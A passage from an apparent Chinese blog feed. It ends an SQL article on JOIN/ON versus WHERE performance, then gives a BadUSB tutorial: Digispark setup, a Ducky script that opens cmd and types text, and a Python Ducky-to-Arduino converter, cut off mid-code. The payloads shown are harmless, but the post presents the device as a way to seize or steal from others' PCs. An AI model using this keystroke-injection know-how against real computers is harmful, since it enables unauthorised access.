两张表都是数据量很大。</p><p>　　虽然不是太明白具体如何判断，但是ＳＱＬ　ＳＥＲＶＥＲ　会自动判断使用哪种方式，所以不需要太关心，除非是做ＤＢＡ的。重点了解下<span style="color: #ff0000;">Nested Loops join。</span></p><p>&nbsp;</p><hr><h3 id="FROM-JOIN-ON-AND-WHERE-总结"><a href="#FROM-JOIN-ON-AND-WHERE-总结" class="headerlink" title="FROM , JOIN , ON , AND , WHERE  总结"></a>FROM , JOIN , ON , AND , WHERE  总结</h3><p><span style="color: #ff0000;"><span style="color: #000000;">　　铺垫了这么多，终于回到关键问题：　平时看到很多ＳＱＬ　写法　有的用WHERE&nbsp; and 进行表连接，有的用JOIN ON 作表连接。这里面不能随便，写不好即影响结果，又阻碍执行效率。可以查看更多详细资料：<a href="http://blog.csdn.net/shangboerds/article/details/5213264">http://blog.csdn.net/shangboerds/article/details/5213264</a></span></span></p><p><span style="color: #ff0000;"><span style="color: #000000;">　　　　</span></span></p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT E.NAME,D.DEPTNAME <span style="color: #0000ff;">FROM EMPLOY  E <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN DEPARTMENT D <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=<span style="color: #000000;">D.DEPTNO   <span style="color: #0000ff;">WHERE D.DEPTNAME<span style="color: #808080;">=<span style="color: #ff0000;">'<span style="color: #ff0000;">市场部<span style="color: #ff0000;">' <p><span style="color: #0000ff;">SELECT E.NAME,D.DEPTNAME <span style="color: #0000ff;">FROM EMPLOY  E <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN DEPARTMENT D <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=<span style="color: #000000;">D.DEPTNO<br><span style="color: #808080;">AND D.DEPTNAME<span style="color: #808080;">=<span style="color: #ff0000;">‘<span style="color: #ff0000;">市场部<span style="color: #ff0000;">‘<br><span style="color: #008080;">–<span style="color: #008080;"> 不论逻辑上还是结果上都不等价</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></p><p>&nbsp;</p><h2 id="现实SQL查询中，一般都不止两个表连接，一般是多表连接查询！"><a href="#现实SQL查询中，一般都不止两个表连接，一般是多表连接查询！" class="headerlink" title="现实SQL查询中，一般都不止两个表连接，一般是多表连接查询！"></a>现实SQL查询中，一般都不止两个表连接，一般是多表连接查询！</h2><p>　　<span style="color: #ff0000;"> <span style="color: #000000;">几个常见错误：</span></span></p><p><span style="color: #ff0000;">　　<span style="color: #000000;">１。胡乱使用LEFT join　：由于分析过执行步骤, LEFT&nbsp;关键字是要在“两张”表连接完成后（思考下多表连接），再对表相当于进行扫描部全的过程，所以会耗费很多时间。</span></span></p><p><span style="color: #ff0000;"><span style="color: #000000;">　　２。分不清表连接 (FROM--AND 法, JOIN -- ON 法)的区别；如下两个SQL:</span></span></p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT <span style="color: #808080;">*<span style="color: #0000ff;">FROM<span style="color: #000000;"> A <span style="color: #0000ff;">INNER <span style="color: #808080;">JOIN B <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">= B.ID <span style="color: #808080;">AND B<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0<span style="color: #0000ff;">INNER <span style="color: #808080;">JOIN C <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">= B.ID <span style="color: #808080;">AND C<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0<span style="color: #0000ff;">SELECT <span style="color: #808080;">*<span style="color: #0000ff;">FROM<span style="color: #000000;"> A <span style="color: #0000ff;">INNER <span style="color: #808080;">JOIN B <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">=<span style="color: #000000;"> B.ID <span style="color: #0000ff;">INNER <span style="color: #808080;">JOIN C <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">=<span style="color: #000000;"> B.ID <span style="color: #0000ff;">WHERE<span style="color: #000000;">     B<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0<span style="color: #808080;">AND C<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0<span style="color: #008080;">--<span style="color: #008080;">此写法效率比上面两种都差,尤其表越多,效果越明显</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></div><p>&nbsp;</p><p>　　　思考表连接的的ＳＱＬ执行顺序。。。前者两张表ＪＯＩＮ　后　马上筛选部分结果在与另一张表ＪＯＩＮ　。后者先将三张表ＪＯＩＮ后再筛选。所以很明显前者效率比后者高.</p><p>　　３。再添加一条SQL :</p><p>　　</p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM<span style="color: #000000;"> A , B , C<span style="color: #0000ff;">WHERE A.ID <span style="color: #808080;">=<span style="color: #000000;"> B.ID <span style="color: #808080;">AND A.ID <span style="color: #808080;">=<span style="color: #000000;"> C.ID<span style="color: #808080;">AND B<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0 <span style="color: #808080;">AND C<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></div><p>　　此结果和第一条ＳＱＬ一样效率不错！　从逻辑上看，似乎ＳＱＬ　会先将表ＪＯＩＮ　后再筛选，但实战结果。是先筛选再ＪＯＩＮ　！因为ＳＱＬ　ＳＥＲＶＥＲ　会内部分析，产生一个最优的执行计划，所以不用你操心，自动帮你处理了！<span style="color: #ff0000;">而使用ＪＯＩＮ　ＯＮ　的话，就<span style="color: #000000;">好像是使用强制命令，告诉数据库，就是要按你的方式处理结果，数据库只好服从！！　所以思考ＳＱＬ写法不能只说要效率，同时还要注重结果对了，这才是关键！</span></span></p><p>　　４。本人一次看别人ＳＱＬ，就是不明白作表连接查询，为什么ＷＨＥＲＥ后面要进行大量的ＷＨＥＲＥ条件筛选，而且都是无关业务逻辑的。在我的传统观念看来，执行WHERE　语句是需要对全表进行扫描的，这样因该会增加查询时间。现在结合前面所讲的，<span style="color: #ff0000;">因为不论是（ＦＲＯＭ－－ＡＮＤ　还是　ＪＯＩＮ－－ＯＮ）方式，再与第三张表ＪＯＩＮ之前都应该尽量先筛选一部分结果（可能是大部分结果）。这样速度会大大提升！</span></p><p>&nbsp;</p><p><span style="color: #ff0000;">　　</span></p><p>&nbsp;</p><p><span style="color: #ff0000;"><span style="color: #000000;"><span style="color: #ff0000;">　　表连接人人都会，可真要说的清清楚楚，也许还需要花点功夫和时间去测试和总结吧。说起来因该有很大的文章，本人知识积累还不够，还希望有人能提点提点，斧正补充一下！！　&nbsp;</span></span></span></p></div>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>U盘攻击：无视防火墙-3秒黑掉你的电脑|BadUSB-制作教程</title>
      <link href="U%E7%9B%98%E6%94%BB%E5%87%BB.html"/>
      <url>U%E7%9B%98%E6%94%BB%E5%87%BB.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="U盘攻击：无视防火墙-3秒黑掉你的电脑-BadUSB-制作教程"><a href="#U盘攻击：无视防火墙-3秒黑掉你的电脑-BadUSB-制作教程" class="headerlink" title="U盘攻击：无视防火墙-3秒黑掉你的电脑|BadUSB-制作教程"></a>U盘攻击：无视防火墙-3秒黑掉你的电脑|BadUSB-制作教程</h1><div class="post-content">            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&amp;id=552194857&amp;auto=1&amp;height=66"></iframe><h2 id="BadUSB简介"><a href="#BadUSB简介" class="headerlink" title="BadUSB简介"></a>BadUSB简介</h2><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/103.jpg" class="lazyload"></p><p>吾旧友，拾U盘,彼异之，插PC，遂上线。 这个愚蠢精彩故事不禁让我萌生学习制作一个BadUSB的想法，为了贴合实际，特地从某宝入手了一个BadUSB板，如下图所示。</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/102.jpg" class="lazyload"></p><blockquote><p>简单来说，通过硬件直接插入对方电脑，让对方电脑执行代码，达到控制主机或者窃取信息等目的(需要自行发挥想象)</p></blockquote><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一个BadUSB_Rubber_Ducky(橡皮鸭)</span><br><span class="line"></span><br><span class="line">Arduino的IDE - 下载地址：(https://www.arduino.cc/en/Main/Software)</span><br><span class="line"></span><br><span class="line">DPinst64驱动(根据电脑型号来,普遍都是64位操作系统)</span><br></pre></td></tr></tbody></table></figure><h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><p><code>Arduino</code>的安装就不讲了，傻瓜式安装:安装包 - 下一步 - 完成！</p><p><code>DPinst64</code>驱动安装的时候要选择<code>始终信任来自Digistump LLC</code> - 安装 - 下一步 - 完成！</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/294.png" class="lazyload"></p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/295.png" class="lazyload"></p><h2 id="Arduino环境配置"><a href="#Arduino环境配置" class="headerlink" title="Arduino环境配置"></a>Arduino环境配置</h2><p>首先打开<code>Arduino</code> - <code>文件</code> - <code>首选项</code> - <code>附加开发板管理器网址</code>:</p><blockquote><p><a href="http://digistump.com/package_digistump_index.json" target="_blank" rel="noopener">http://digistump.com/package_digistump_index.json</a></p></blockquote><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/296.png" class="lazyload"></p><p>在<code>工具</code> - <code>开发板管理器</code> - 先等待它下载完文件:</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/297.png" class="lazyload"></p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/298.png" class="lazyload"></p><p>接着在<code>类型</code>下拉菜单里有一个<code>贡献</code>然后选择<code>Digistump_AVR</code>安装完毕就Ok</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/299.png" class="lazyload"></p><p>最后选择开发板对应的<code>开发板型号</code>和<code>编程器</code>然后选择<code>Keyboard</code>一个模板：</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/300.png" class="lazyload"></p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/301.png" class="lazyload"></p><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>这是它示例的代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"DigiKeyboard.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>{</span><br><span class="line">  <span class="comment">// don't need to set anything up to use DigiKeyboard</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>{</span><br><span class="line">  <span class="comment">// this is generally not necessary but with some older systems it seems to</span></span><br><span class="line">  <span class="comment">// prevent missing the first character after a delay:</span></span><br><span class="line">  DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Type out this string letter by letter on the computer (assumes US-style</span></span><br><span class="line">  <span class="comment">// keyboard)</span></span><br><span class="line">  DigiKeyboard.<span class="built_in">println</span>(<span class="string">"Hello Power_Liu"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// It's better to use DigiKeyboard.delay() over the regular Arduino delay()</span></span><br><span class="line">  <span class="comment">// if doing keyboard stuff because it keeps talking to the computer to make</span></span><br><span class="line">  <span class="comment">// sure the computer knows the keyboard is alive and connected</span></span><br><span class="line">  DigiKeyboard.<span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/302.png" class="lazyload"></p><p>上传烧录:</p><blockquote><p>提示:Running Digispark Uploader…Plug in device now… (will timeout in 60 seconds)</p></blockquote><p>这个时候需要60s的时间插入你的BadUSB:</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/303.png" class="lazyload"></p><p>提示 ： Micronucleus done. Thank you! 说明已经上传成功！这个时候插入BadUSB它会一直输入<code>Hello Power_Liu</code>直到拔掉为止:</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/304.png" class="lazyload"></p><h2 id="手把手教你写一个”Hello-Hacker-”"><a href="#手把手教你写一个”Hello-Hacker-”" class="headerlink" title="手把手教你写一个”Hello Hacker!”"></a>手把手教你写一个”Hello Hacker!”</h2><p>1、先在记事本中写好我们的代码 - 另存为 <code>hacker.txt</code>:</p><figure class="highlight c#"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个代码的意思就是打开cmd，然后输出Hello Hacker!</span></span><br><span class="line">DELAY <span class="number">5000</span></span><br><span class="line">GUI r </span><br><span class="line">DELAY <span class="number">500</span></span><br><span class="line">STRING cmd</span><br><span class="line">DELAY <span class="number">500</span></span><br><span class="line">ENTER</span><br><span class="line">ENTER</span><br><span class="line">DELAY <span class="number">1000</span></span><br><span class="line">STRING Hello Hacker!</span><br><span class="line">DELAY <span class="number">1500</span> </span><br><span class="line">ENTER</span><br><span class="line">ENTER</span><br></pre></td></tr></tbody></table></figure><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/305.png" class="lazyload"></p><p>2、使用我们的Python转换脚本吧<code>hacker.txt</code>转换为<code>ino</code>文件：</p><blockquote><p>Duckyspark_translator.py hacker.txt hacker</p></blockquote><p>Python转换脚本源代码:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payload_input = <span class="string">''</span></span><br><span class="line">l=<span class="string">'//'</span></span><br><span class="line">mod_input=<span class="string">''</span></span><br><span class="line">mod_output=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replacement</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'DigiKeyboard.'</span>, end =<span class="string">''</span>)</span><br><span class="line">    print(</span><br><span class="line">str(l.replace(<span class="string">' a'</span>, <span class="string">'KEY_A'</span>).replace(<span class="string">' a '</span>, <span class="string">'KEY_A'</span>)</span><br><span class="line">.replace(<span class="string">' b'</span>, <span class="string">'KEY_B'</span>)</span><br><span class="line">.replace(<span class="string">' c'</span>, <span class="string">'KEY_C'</span>)</span><br><span class="line">.replace(<span class="string">' d'</span>, <span class="string">'KEY_D'</span>)</span><br><span class="line">.replace(<span class="string">' e'</span>, <span class="string">'KEY_E'</span>)</span><br><span class="line">.replace(<span class="string">' f'</span>, <span class="string">'KEY_F'</span>)</span><br><span class="line">.replace(<span class="string">' g'</span>, <span class="string">'KEY_G'</span>)</span><br><span class="line">.replace(<span class="string">' h'</span>, <span class="string">'KEY_H'</span>)</span><br><span class="line">.replace(<span class="string">' i'</span>, <span class="string">'KEY_I'</span>)</span><br><span class="line">.replace(<span class="string">' j'</span>, <span class="string">'KEY_J'</span>)</span><br><span class="line">.replace(<span class="string">' k'</span>, <span class="string">'KEY_K'</span>)</span><br><span class="line">.replace(<span class="string">' l'</span>, <span class="string">'KEY_L'</span>)</span><br><span class="line">.replace(<span class="string">' m'</span>, <span class="string">'KEY_M'</span>)</span><br><span class="line">.replace(<span class="string">' n'</span>, <span class="string">'KEY_N'</span>)</span><br><span class="line">.replace(<span class="string">' o'</span>, <span class="string">'KEY_O'</span>)</span><br><span class="line">.replace(<span class="string">' p'</span>, <span class="string">'KEY_P'</span>)</span><br><span class="line">.replace(<span class="string">' q'</span>, <span class="string">'KEY_Q'</span>)</span><br><span class="line">.replace(<span class="string">' r'</span>, <span class="string">'KEY_R'</span>)</span><br><span class="line">.replace(<span class="string">' s'</span>, <span class="string">'KEY_S'</span>)</span><br><span class="line">.replace(<span class="string">' t'</span>, <span class="string">'KEY_T'</span>)</span><br><span class="line">.replace(<span class="string">' u'</span>, <span class="string">'KEY_U'</span>)</span><br><span class="line">.replace(<span class="string">' v'</span>, <span class="string">'KEY_V'</span>)</span><br><span class="line">.replace(<span class="string">' w'</span>, <span class="string">'KEY_W'</span>)</span><br><span class="line">.replace(<span class="string">' x'</span>, <span class="string">'KEY_X'</span>)</span><br><span class="line">.replace(<span class="string">' y'</span>, <span class="string">'KEY_Y'</span>)</span><br><span class="line">.replace(<span class="string">' z'</span>, <span class="string">'KEY_Z'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1-0 if needed</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#f1-f12</span></span><br><span class="line">.replace(<span class="string">' F1'</span>,<span class="string">'KEY_F1'</span>)</span><br><span class="line">.replace(<span class="string">' F2'</span>,<span class="string">'KEY_F2'</span>)</span><br><span class="line">.replace(<span class="string">' F3'</span>,<span class="string">'KEY_F3'</span>)</span><br><span class="line">.replace(<span class="string">' F4'</span>,<span class="string">'KEY_F4'</span>)</span><br><span class="line">.replace(<span class="string">' F5'</span>,<span class="string">'KEY_F5'</span>)</span><br><span class="line">.replace(<span class="string">' F6'</span>,<span class="string">'KEY_F6'</span>)</span><br><span class="line">.replace(<span class="string">' F7'</span>,<span class="string">'KEY_F7'</span>)</span><br><span class="line">.replace(<span class="string">' F8'</span>,<span class="string">'KEY_F8'</span>)</span><br><span class="line">.replace(<span class="string">' F9'</span>,<span class="string">'KEY_F9'</span>)</span><br><span class="line">.replace(<span class="string">' F10'</span>,<span class="string">'KEY_F10'</span>)</span><br><span class="line">.replace(<span class="string">' F11'</span>,<span class="string">'KEY_F11'</span>)</span><br><span class="line">.replace(<span class="string">' F12'</span>,<span class="string">'KEY_F12'</span>)</span><br><span class="line"><span class="comment">#arrows </span></span><br><span class="line">.replace(<span class="string">'LEFTARROW'</span>, <span class="string">'KEY_ARROW_LEFT'</span>)</span><br><span class="line">.replace(<span class="string">'RIGHTARROW'</span>, <span class="string">'KEY_ARROW_RIGHT'</span>)</span><br><span class="line">.replace(<span class="string">'UPARROW'</span>,<span class="string">'KEY_ARROW_UP'</span>)</span><br><span class="line">.replace(<span class="string">'DOWNARROW'</span>,<span class="string">'KEY_ARROW_DOWN'</span>)</span><br><span class="line">.replace(<span class="string">'LEFT'</span>, <span class="string">'KEY_ARROW_LEFT'</span>)</span><br><span class="line">.replace(<span class="string">'RIGH'</span>, <span class="string">'KEY_ARROW_RIGHT'</span>)</span><br><span class="line">.replace(<span class="string">'UP'</span>,<span class="string">'KEY_ARROW_UP'</span>)</span><br><span class="line">.replace(<span class="string">'DOWN'</span>,<span class="string">'KEY_ARROW_DOWN'</span>)</span><br><span class="line"><span class="comment">#keys</span></span><br><span class="line">.replace(<span class="string">'PRINTSCREEN'</span>,<span class="string">'sendKeyStroke(KEY_PRT_SCR'</span> )</span><br><span class="line">.replace(<span class="string">'TAB'</span>, <span class="string">'sendKeyStroke(KEY_TAB'</span>)</span><br><span class="line">.replace(<span class="string">'SPACE'</span>, <span class="string">'sendKeyStroke(KEY_SPACE'</span>)</span><br><span class="line">.replace(<span class="string">'CONTROL ALT'</span>,<span class="string">'sendKeyStroke(MOD_ALT_RIGHT,'</span>)</span><br><span class="line">.replace(<span class="string">'CTRL ALT'</span>,<span class="string">'sendKeyStroke(MOD_ALT_RIGHT,'</span>)</span><br><span class="line">.replace(<span class="string">'ESCAPE'</span>,<span class="string">'sendKeyStroke(KEY_ESC'</span> )</span><br><span class="line">.replace(<span class="string">'ENTER'</span>,<span class="string">'sendKeyStroke(KEY_ENTER'</span>)),end = <span class="string">''</span>)</span><br><span class="line">    print(<span class="string">');'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modreplacement</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'DigiKeyboard.'</span>, end =<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">'sendKeyStroke('</span>, end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    print(</span><br><span class="line">str(l.replace (mod_input, <span class="string">''</span>).replace(<span class="string">' a'</span>, <span class="string">'KEY_A'</span>).replace(<span class="string">' a '</span>, <span class="string">'KEY_A'</span>)</span><br><span class="line">.replace(<span class="string">' b'</span>, <span class="string">'KEY_B'</span>)</span><br><span class="line">.replace(<span class="string">' c'</span>, <span class="string">'KEY_С'</span>)</span><br><span class="line">.replace(<span class="string">' d'</span>, <span class="string">'KEY_D'</span>)</span><br><span class="line">.replace(<span class="string">' e'</span>, <span class="string">'KEY_E'</span>)</span><br><span class="line">.replace(<span class="string">' f'</span>, <span class="string">'KEY_F'</span>)</span><br><span class="line">.replace(<span class="string">' g'</span>, <span class="string">'KEY_G'</span>)</span><br><span class="line">.replace(<span class="string">' h'</span>, <span class="string">'KEY_H'</span>)</span><br><span class="line">.replace(<span class="string">' i'</span>, <span class="string">'KEY_I'</span>)</span><br><span class="line">.replace(<span class="string">' j'</span>, <span class="string">'KEY_J'</span>)</span><br><span class="line">.replace(<span class="string">' k'</span>, <span class="string">'KEY_K'</span>)</span><br><span class="line">.replace(<span class="string">' l'</span>, <span class="string">'KEY_L'</span>)</span><br><span class="line">.replace(<span class="string">' m'</span>, <span class="string">'KEY_M'</span>)</span><br><span class="line">.replace(<span class="string">' n'</span>, <span class="string">'KEY_N'</span>)</span><br><span class="line">.replace(<span class="string">' o'</span>, <span class="string">'KEY_O'</span>)</span><br><span class="line">.replace(<span class="string">' p'</span>, <span class="string">'KEY_P'</span>)</span><br><span class="line">.replace(<span class="string">' q'</span>, <span class="string">'KEY_Q'</span>)</span><br><span class="line">.replace(<span class="string">' r'</span>, <span class="string">'KEY_R'</span>)</span><br><span class="line">.replace(<span class="string">' s'</span>, <span class="string">'KEY_S'</span>)</span><br><span class="line">.replace(<span class="string">' t'</span>, <span class="string">'KEY_T'</span>)</span><br><span class="line">.replace(<span class="string">' u'</span>, <span class="string">'KEY_U'</span>)</span><br><span class="line">.replace(<span class="string">' v'</span>, <span class="string">'KEY_V'</span>)</span><br><span class="line">.replace(<span class="string">' w'</span>, <span class="string">'KEY_W'</span>)</span><br><span class="line">.replace(<span class="string">' 